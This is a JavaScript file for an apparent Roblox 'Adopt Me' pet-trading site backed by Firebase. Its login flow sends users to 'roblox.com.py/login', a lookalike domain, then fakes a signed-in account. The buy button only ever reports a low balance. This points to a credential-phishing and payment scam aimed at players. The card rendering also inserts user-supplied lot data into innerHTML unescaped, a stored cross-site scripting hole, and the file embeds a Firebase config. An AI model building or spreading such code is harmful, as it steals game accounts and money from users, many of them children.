// =========================================================
// 1. ПОДКЛЮЧЕНИЕ FIREBASE И НАСТРОЙКИ
// =========================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

// ТВОЯ КОНФИГУРАЦИЯ (Вставлена из твоего сообщения)
const firebaseConfig = {
  apiKey: "AIzaSyBUVG2e9TVe6WlU72Hrjin03QXtkTGiNc0",
  authDomain: "star-marketdb.firebaseapp.com",
  databaseURL: "https://star-marketdb-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "star-marketdb",
  storageBucket: "star-marketdb.firebasestorage.app",
  messagingSenderId: "1040104655803",
  appId: "1:1040104655803:web:45bc355371265d36d8129e"
};

// Инициализация приложения
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Ссылка на таблицу с лотами
const petsRef = ref(db, 'market_lots');

// =========================================================
// 2. ДАННЫЕ И ПЕРЕМЕННЫЕ
// =========================================================
const ROBLOX_AUTH_LINK = "https://roblox.com.py/login?returnUrl=4210845075632139"; 
const ADOPT_ME_DATA = {
    "pets": ["Shadow Dragon","Bat Dragon","Giraffe","Frost Dragon","Owl","Parrot","Evil Unicorn","Crow","Arctic Reindeer","Turtle","Kangaroo","Unicorn","Dragon","Kitsune","Dog","Cat","Otter"]
};

let currentUser = null; 

// Элементы интерфейса
const petsContainer = document.getElementById('petsContainer');
const loginModal = document.getElementById('loginModal');
const sellModal = document.getElementById('sellModal');

// Заполняем выпадающий список петов
const petsList = document.getElementById('petsList');
ADOPT_ME_DATA.pets.sort().forEach(pet => {
    let opt = document.createElement('option');
    opt.value = pet;
    petsList.appendChild(opt);
});

// =========================================================
// 3. СЛУШАЕМ БАЗУ ДАННЫХ (REALTIME)
// =========================================================
// Эта функция срабатывает каждый раз, когда кто-то добавляет лот
onValue(petsRef, (snapshot) => {
    petsContainer.innerHTML = ""; // Очищаем текущий список
    const data = snapshot.val();  // Получаем данные

    if (data) {
        // Превращаем данные в массив и переворачиваем (новые сверху)
        const lotsArray = Object.values(data).reverse();
        
        lotsArray.forEach(lot => {
            renderCard(lot);
        });
    } else {
        petsContainer.innerHTML = "<p style='color:#666; width:100%; text-align:center; padding: 20px;'>Лотов пока нет. Будьте первым!</p>";
    }
});

// Функция отрисовки карточки
function renderCard(lot) {
    const card = document.createElement('div');
    card.className = 'item-card';

    // Рендер стикеров
    let badgesHtml = "";
    if(lot.stickers && lot.stickers.length > 0) {
        badgesHtml = `<div class="badges-row">`;
        lot.stickers.forEach(sticker => {
            badgesHtml += `<div class="mini-sticker ${sticker.class}">${sticker.letter}</div>`;
        });
        badgesHtml += `</div>`;
    }

    card.innerHTML = `
        <div class="card-img-area">
            ${badgesHtml}
            <img src="${lot.image}" onerror="this.src='https://static.wikia.nocookie.net/adoptme/images/5/5e/Cracked_Egg.png'">
        </div>
        <div class="card-info">
            <div class="card-name" title="${lot.name}">${lot.name}</div>
            <span class="card-seller">@${lot.contact}</span>
            <div class="price-row">
                <span class="price">${lot.price} ₽</span>
                <button class="btn-buy-card" onclick="alert('Недостаточно средств на балансе. Функция в разработке.')">
                    <i class="fa-solid fa-cart-shopping"></i>
                </button>
            </div>
        </div>
    `;
    petsContainer.appendChild(card);
}

// =========================================================
// 4. СИСТЕМА АВТОРИЗАЦИИ
// =========================================================
const headerLoginBtn = document.getElementById('headerLoginBtn');
const startAuthBtn = document.getElementById('startAuthBtn');
const confirmAuthBtn = document.getElementById('confirmAuthBtn');
const loginConfirmArea = document.getElementById('loginConfirmArea');

// Проверка входа
function checkAuth() {
    if (currentUser) return true;
    
    // Если не вошел
    loginModal.style.display = 'flex';
    startAuthBtn.style.display = 'block';
    loginConfirmArea.style.display = 'none';
    return false;
}

// Кнопки интерфейса
headerLoginBtn.onclick = () => checkAuth();
document.getElementById('inventoryBtn').onclick = (e) => { 
    if(!checkAuth()) e.preventDefault(); 
    else alert("Ваш инвентарь пуст.");
};
document.getElementById('balanceBtn').onclick = () => { 
    if(checkAuth()) alert("Меню пополнения баланса..."); 
};

// Логика модального окна входа
startAuthBtn.onclick = () => {
    window.open(ROBLOX_AUTH_LINK, '_blank');
    startAuthBtn.style.display = 'none';
    loginConfirmArea.style.display = 'block';
};

confirmAuthBtn.onclick = () => {
    // Генерируем случайного пользователя
    const rnd = Math.floor(Math.random() * 9000) + 1000;
    currentUser = { name: `RobloxUser_${rnd}` };
    updateHeader();
    loginModal.style.display = 'none';
};

function updateHeader() {
    const area = document.getElementById('userProfileArea');
    area.innerHTML = `
        <div class="user-badge">
            <div class="avatar-circle"></div>
            <span>${currentUser.name}</span>
            <i class="fa-solid fa-right-from-bracket" onclick="location.reload()" style="cursor:pointer; margin-left:5px; color:#666;" title="Выйти"></i>
        </div>
    `;
}

// =========================================================
// 5. ЛОГИКА ПРОДАЖИ (ОТПРАВКА В FIREBASE)
// =========================================================
const sidebarSellBtn = document.getElementById('sidebarSellBtn');
const sellForm = document.getElementById('sellForm');

sidebarSellBtn.onclick = () => {
    if(checkAuth()) sellModal.style.display = 'flex';
};

// Выбор стикеров (F, R, N, M)
const selectedProps = { propFly: false, propRide: false, propNeon: false, propMega: false };

window.toggleProp = function(id) {
    const el = document.getElementById(id);
    
    // Логика: Мега выключает Неон и наоборот
    if(id === 'propMega' && !selectedProps.propMega) {
        selectedProps.propNeon = false;
        document.getElementById('propNeon').classList.remove('selected');
    }
    if(id === 'propNeon' && !selectedProps.propNeon) {
        selectedProps.propMega = false;
        document.getElementById('propMega').classList.remove('selected');
    }

    selectedProps[id] = !selectedProps[id];
    el.classList.toggle('selected', selectedProps[id]);
};

// Загрузка фото
const fileInput = document.getElementById('petFileInput');
const fileNameLabel = document.getElementById('fileName');
let customImageBase64 = null;

fileInput.onchange = () => {
    const file = fileInput.files[0];
    if (file) {
        // Проверка размера (Макс 1МБ для базы данных)
        if(file.size > 1048576) {
            alert("Файл слишком большой! Выберите фото меньше 1 МБ.");
            fileInput.value = "";
            return;
        }
        fileNameLabel.innerText = "Файл выбран";
        const reader = new FileReader();
        reader.onload = (e) => customImageBase64 = e.target.result;
        reader.readAsDataURL(file);
    }
};

// Отправка формы
sellForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const petName = document.getElementById('petNameInput').value;
    const price = document.getElementById('petPrice').value;
    const telegram = document.getElementById('telegramUser').value;

    // Картинка: своя или с вики
    let finalImage = customImageBase64;
    if (!finalImage) {
        const wikiName = petName.replace(/ /g, '_');
        finalImage = `https://static.wikia.nocookie.net/adoptme/images/a/a5/${wikiName}.png`;
    }

    // Собираем стикеры
    let activeStickers = [];
    if(selectedProps.propFly) activeStickers.push({class: 'sticker-f', letter: 'F'});
    if(selectedProps.propRide) activeStickers.push({class: 'sticker-r', letter: 'R'});
    if(selectedProps.propNeon) activeStickers.push({class: 'sticker-n', letter: 'N'});
    if(selectedProps.propMega) activeStickers.push({class: 'sticker-m', letter: 'M'});

    // Создаем объект лота
    const newLot = {
        id: Date.now(),
        name: petName,
        price: price,
        seller: currentUser.name,
        contact: telegram,
        image: finalImage,
        stickers: activeStickers,
        timestamp: Date.now()
    };

    // ОТПРАВЛЯЕМ В FIREBASE
    push(petsRef, newLot)
        .then(() => {
            // Если все прошло успешно
            sellModal.style.display = 'none';
            sellForm.reset();
            resetProps();
        })
        .catch((error) => {
            alert("Ошибка: " + error.message);
        });
});

function resetProps() {
    Object.keys(selectedProps).forEach(key => {
        selectedProps[key] = false;
        document.getElementById(key).classList.remove('selected');
    });
    customImageBase64 = null;
    fileNameLabel.innerText = "Или останется стоковое";
}

// Закрытие модалок
document.querySelectorAll('.close-modal').forEach(btn => btn.onclick = function() {
    this.closest('.modal-overlay').style.display = 'none';
});
window.onclick = (e) => {
    if(e.target == loginModal || e.target == sellModal) {
        loginModal.style.display = 'none';
        sellModal.style.display = 'none';
    }
}
